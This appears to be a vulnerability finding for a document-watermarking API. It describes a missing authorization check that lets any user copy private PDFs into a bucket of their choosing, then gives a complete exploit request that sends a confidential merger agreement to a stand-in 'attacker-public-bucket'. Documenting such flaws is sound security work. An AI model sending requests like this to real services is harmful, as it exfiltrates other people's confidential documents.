diagnosis: The PDF watermarking stream worker retrieves private documents from process.env.DOCS_BUCKET based on documentKey in the message payload and saves the result to client-specified destinationBucket. It does not check if the requesting user has read authorization for documentKey, permitting exfiltration of confidential PDFs to attacker-controlled S3 buckets.
exploit_request:
POST /api/documents/watermark-stream HTTP/1.1
Host: app.legalcloud.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"documentKey": "confidential_acquisitions/merger_agreement_2025.pdf", "watermarkText": "CONFIDENTIAL", "destinationBucket": "attacker-public-bucket"}
